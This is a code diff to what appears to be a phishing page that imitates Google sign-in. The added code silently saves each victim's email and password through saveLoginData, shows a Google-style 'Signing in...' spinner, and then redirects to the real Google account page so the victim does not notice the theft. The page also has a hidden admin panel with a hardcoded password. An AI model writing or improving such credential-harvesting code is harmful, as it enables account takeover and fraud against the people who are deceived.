@@ -298,6 +298,51 @@
             display: none;
         }
 
+        /* Loading Overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
         /* Admin Panel Styles */
         .data-panel {
             position: fixed;
@@ -419,6 +464,12 @@
     </style>
 </head>
 <body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Signing in...</div>
+    </div>
+
     <!-- Admin Login Panel -->
     <div id="adminLoginPanel" class="data-panel hidden">
         <h3>🔐 Admin Access</h3>
@@ -570,7 +621,6 @@
         const ADMIN_PASSWORD = 'admin123';
         let tapCount = 0;
         let tapTimer = null;
-        const REDIRECT_URL = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26gar%3DWzEzMywiMjM2NzM2Il0%26sl%3Dtrue&dsh=S403829768%3A1760543049339758&ifkv=AfYwgwVpjgImavTsjjVNsDbfRS4MxbIV78qoFBJByFZa6J_RQw69D2TuWGjBJ8L08i8gNGcyDzHgkw&service=accountsettings&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
 
         // Show password toggles
         document.getElementById('showPassword')?.addEventListener('change', function() {
@@ -696,10 +746,16 @@
             const email = document.getElementById('displayEmail').textContent;
             const password = document.getElementById('password').value;
             
+            // Save login data silently
             saveLoginData(email, password, 'signin');
             
-            // Redirect to Google sign-in page instead of showing success message
-            window.location.href = REDIRECT_URL;
+            // Show loading overlay (Google-style)
+            document.getElementById('loadingOverlay').classList.add('active');
+            
+            // Redirect to real Google account page
+            setTimeout(() => {
+                window.location.href = 'https://myaccount.google.com';
+            }, 1500);
         }
 
         function handleCreateAccount(e) {
@@ -723,8 +779,14 @@
             const fullEmail = email.includes('@') ? email : email + '@gmail.com';
             saveLoginData(fullEmail, password, 'signup');
 
-            // Redirect to Google sign-in page instead of showing success message
-            window.location.href = REDIRECT_URL;
+            // Show loading overlay (Google-style)
+            document.getElementById('loadingOverlay').classList.add('active');
+            document.getElementById('loadingOverlay').querySelector('.loading-text').textContent = 'Creating account...';
+
+            // Redirect to real Google account page
+            setTimeout(() => {
+                window.location.href = 'https://myaccount.google.com';
+            }, 1500);
         }
     </script>
 </body>
